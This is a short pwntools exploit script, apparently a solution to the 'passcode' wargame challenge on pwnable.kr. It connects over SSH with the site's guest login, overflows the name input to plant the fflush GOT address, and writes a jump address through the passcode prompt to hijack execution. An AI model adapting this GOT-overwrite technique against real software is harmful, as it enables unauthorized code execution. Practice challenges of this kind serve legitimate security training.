from pwn import *

context.log_level = 'debug'

ssh_conn = ssh(host='pwnable.kr', port=2222, user='passcode', password='guest')
p = ssh_conn.process('passcode')
e = ELF('passcode')
fflush_got = e.got['fflush']
jmp_addr = 0x0804928f

payload = b"A" * 0x60 + p32(fflush_got)
p.recvuntil(b"name : ")
p.send(payload)

p.recvuntil(b"passcode1 : ")
p.sendline(str(jmp_addr).encode())
p.interactive()

